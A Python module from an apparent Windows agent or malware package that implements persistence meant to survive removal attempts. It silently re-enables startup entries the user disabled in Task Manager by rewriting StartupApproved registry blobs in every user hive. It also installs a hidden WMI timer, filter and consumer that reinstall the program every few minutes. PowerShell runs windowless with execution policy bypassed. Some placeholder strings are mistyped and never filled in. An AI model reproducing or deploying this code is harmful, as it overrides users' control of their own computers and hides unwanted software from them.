"""Persistence anchors that survive a user poking at Task Manager.

Two mechanisms live here.

**StartupApproved rewrite.**  Task Manager's Startup tab *disables* an entry by
writing a 12-byte blob under ``Explorer\\StartupApproved`` - it does not delete
the Run value.  Nothing notices, so the entry stays disabled forever and the
user believes they removed us.  We rewrite the blob back to enabled.

**A permanent WMI consumer.**  Lives in ``root\\subscription``, has no binary,
no service and no shortcut.  It runs ``wu.cmd`` every few minutes, which
rebuilds the whole install from the cached kit if the folder was deleted.

Removal order matters: binding -> consumer -> filter -> timer.  Delete the
filter first and the binding survives, goes stale, and keeps firing.
"""

from __future__ import annotations

import os
import subprocess
import time

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0

FILTER_NAME = "WUS_Filter"
CONSUMER_NAME = "WUS_Consumer"
TIMER_ID = "WUS_Timer"
TIMER_INTERVAL_MS = 300_000  # 5 minutes
_NAMESPACE = r"root\subscription"

# First byte 0x02/0x06 means enabled, 0x03 means disabled-by-user.
_ENABLED_BLOB = bytes([2] + [0] * 11)

_APPROVED_SUBKEYS = (
    r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
    r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32",
    r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder",
)

_last_wmi_check = 0.0
_WMI_RECHECK = 600.0


def _ps(script: str, timeout: float = 90.0) -> tuple[int, str]:
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW,
        )
        return result.returncode, (result.stdout or "") + (result.stderr or "")
    except Exception as error:
        return 1, str(error)


def is_admin() -> bool:
    from .agent import stealth
    return stealth.is_admin()


def is_system() -> bool:
    return IS_WINDOWS and os.environ.get("USERNAME", "").upper() == "SYSTEM"


# WMI scripts
_INSTALL_PS = r'''
$ErrorActionPreference = 'Stop'
$ns  = 'root\subscription'
$cmd = '@@CMD@@'
$ms  = @@MS@@

try {
    Set-WmiInstance -Namespace $ns -Class __IntervalTimerInstruction -Arguments @{
        TimerID = '@@TIMER@@'; IntervalBetweenEvents = $ms; SkipIfPassed = $false
    } | Out-Null
} catch {}

# Remove in dependency order so nothing goes stale.
Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Consumer -like "*@@CONSUMER@@" } |
    Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='@@CONSUMER@'" -ErrorAction SilentlyContinue |
    Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='@@FILTER@'" -ErrorAction SilentlyContinue |
    Remove-WmiObject -ErrorAction SilentlyContinue

$filter = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
    Name            = '@@FILTER@@'
    EventNamespace  = $ns
    QueryLanguage   = 'WQL'
    Query           = "SELECT * FROM __TimerEvent WHERE TimerID='@@TIMER@@'"
}

$consumer = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{
    Name                = '@@CONSUMER@@'
    CommandLineTemplate = $cmd
    RunInteractively    = $false
}

Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; Consumer = $consumer
} | Out-Null

'ok'
'''

_REMOVE_PS = r'''
$ns = 'root\subscription'
Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Consumer -like "*@@CONSUMER@@" } |
    Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='@@CONSUMER@'" -ErrorAction SilentlyContinue |
    Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='@@FILTER@'" -ErrorAction SilentlyContinue |
    Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace $ns -Class __IntervalTimerInstruction -Filter "TimerID='@@TIMER@'" -ErrorAction SilentlyContinue |
    Remove-WmiObject -ErrorAction SilentlyContinue
'ok'
'''

_QUERY_PS = (
    "$ns='root\\subscription'; "
    "(Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer "
    f"-Filter \"Name='{CONSUMER_NAME}'\" -ErrorAction SilentlyContinue | "
    "Measure-Object).Count"
)


def _fill(script: str, shim: str = "") -> str:
    return (
        script.replace("@@FILTER@@", FILTER_NAME)
        .replace("@@CONSUMER@@", CONSUMER_NAME)
        .replace("@@TIMER@@", TIMER_ID)
        .replace("@@MS@@", str(TIMER_INTERVAL_MS))
        .replace("@@CMD@@", f'cmd.exe /c "%s"' % shim)
    )


def consumer_present() -> bool:
    global _last_wmi_check
    if not IS_WINDOWS or not is_admin():
        return False
    code, out = _ps(_QUERY_PS, timeout=45)
    _last_wmi_check = time.time()
    return code == 0 and out.strip().splitlines()[-1:][0:1] == ["1"]


def install() -> list[str]:
    """Create the WMI consumer pointing at the shim.  Admin only."""
    if not IS_WINDOWS or not is_admin():
        return []
    from .agent import stealth
    shim = stealth.shim_path()
    if not os.path.isfile(shim):
        return []
    code, out = _ps(_fill(_INSTALL_PS, shim), timeout=120)
    if code == 0 and "ok" in out:
        global _last_wmi_check
        _last_wmi_check = time.time()
        return ["guardian: WMI consumer"]
    return []


def remove() -> list[str]:
    if not IS_WINDOWS or not is_admin():
        return []
    code, out = _ps(_fill(_REMOVE_PS), timeout=120)
    if code == 0 and "ok" in out:
        return ["guardian: WMI consumer removed"]
    return []


def _user_hives():
    import winreg
    hives = [("HKCU", winreg.HKEY_CURRENT_USER)]
    try:
        users = winreg.OpenKey(winreg.HKEY_USERS, "")
    except OSError:
        return hives
    index = 0
    while True:
        try:
            name = winreg.EnumKey(users, index)
            index += 1
        except OSError:
            break
        if name.endswith("_Classes") or not name.startswith("S-1-5-21"):
            continue
        try:
            hives.append((name, winreg.OpenKey(winreg.HKEY_USERS, name)))
        except OSError:
            continue
    return hives


def clear_startup_approved() -> list[str]:
    """Delete StartupApproved entries during uninstall."""
    if not IS_WINDOWS:
        return []
    import winreg
    from . import config

    names = tuple(config.RUN_VALUE_NAMES) + (config.PRODUCT_NAME + ".cmd",)
    cleared: list[str] = []
    for label, hive in _user_hives():
        for subkey in _APPROVED_SUBKEYS:
            try:
                key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE)
            except OSError:
                continue
            with key:
                for name in names:
                    try:
                        winreg.DeleteValue(key, name)
                        cleared.append(f"{label}\{name}")
                    except OSError:
                        pass
    return cleared


def ensure_startup_approved() -> list[str]:
    if not IS_WINDOWS:
        return []
    import winreg
    from . import config

    names = tuple(config.RUN_VALUE_NAMES) + (config.PRODUCT_NAME + ".cmd",)
    fixed: list[str] = []
    for label, hive in _user_hives():
        for subkey in _APPROVED_SUBKEYS:
            try:
                key = winreg.CreateKeyEx(hive, subkey, 0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
            except OSError:
                continue
            with key:
                for name in names:
                    try:
                        data, _kind = winreg.QueryValueEx(key, name)
                    except OSError:
                        continue
                    if not isinstance(data, bytes) or len(data) < 12:
                        continue
                    if data[0] in (2, 6):
                        continue
                    try:
                        winreg.SetValueEx(key, name, 0, winreg.REG_BINARY, _ENABLED_BLOB)
                        fixed.append(f"{label}\\{name}")
                    except OSError:
                        pass
    return fixed


def ensure() -> list[str]:
    actions = ensure_startup_approved()
    if time.time() - _last_wmi_check > _WMI_RECHECK:
        if is_admin() and not consumer_present():
            actions += install()
    return actions


def status(mutate: bool = False) -> dict:
    return {
        "admin": is_admin(),
        "system": is_system(),
        "wmi_consumer": consumer_present() if is_admin() else None,
        "shim": _shim_exists(),
        "startup_approved": len(ensure_startup_approved()) if mutate else None,
    }


def _shim_exists() -> bool:
    try:
        from .agent import stealth
        return os.path.isfile(stealth.shim_path())
    except Exception:
        return False
